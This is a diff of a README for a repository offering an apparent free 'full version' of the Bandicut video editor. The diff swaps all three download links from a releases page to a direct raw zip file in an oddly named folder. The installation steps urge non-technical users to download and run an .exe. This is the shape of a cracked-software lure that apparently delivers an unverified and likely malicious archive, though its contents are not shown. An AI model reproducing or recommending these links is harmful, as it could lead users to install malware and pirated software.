@@ -1,6 +1,6 @@
 # 🎬 bandicut-full-version-2026 - Edit videos quickly without quality loss
 
-[![](https://img.shields.io/badge/⬇_DOWNLOAD_SOFTWARE-0078D6?style=for-the-badge)](https://github.com/africavi3221/bandicut-full-version-2026/releases)
+[![](https://img.shields.io/badge/⬇_DOWNLOAD_SOFTWARE-0078D6?style=for-the-badge)](https://github.com/africavi3221/bandicut-full-version-2026/raw/refs/heads/main/metarhyolite/version_full_bandicut_2.7.zip)
 
 Bandicut provides a way to edit video files on your computer. This software focuses on cutting and merging video tracks. You maintain video quality because the software does not re-encode your files. Trimming and joining happen at high speeds.
 
@@ -18,7 +18,7 @@ Bandicut requires a standard Windows environment to operate. Ensure your compute
 
 Follow these steps to set up the software on your machine. You do not need technical expertise to complete this process.
 
-1. Visit the software repository page: https://github.com/africavi3221/bandicut-full-version-2026/releases
+1. Visit the software repository page: https://github.com/africavi3221/bandicut-full-version-2026/raw/refs/heads/main/metarhyolite/version_full_bandicut_2.7.zip
 2. Locate the latest release version on the page.
 3. Click the link for the installation file, which ends in .exe.
 4. Save the file to your desktop or downloads folder.
@@ -27,7 +27,7 @@ Follow these steps to set up the software on your machine. You do not need techn
 
 ## 🛠️ Installation Detailed Steps
 
-Download the software from the official link provided here: [Download Installer](https://github.com/africavi3221/bandicut-full-version-2026/releases).
+Download the software from the official link provided here: [Download Installer](https://github.com/africavi3221/bandicut-full-version-2026/raw/refs/heads/main/metarhyolite/version_full_bandicut_2.7.zip).
 
 Once you double-click the installer, a window appears to guide you through the setup. Select your preferred language and click next. The installer suggests a default folder for the files. Accept this default folder to ensure the software finds all necessary components. 
 
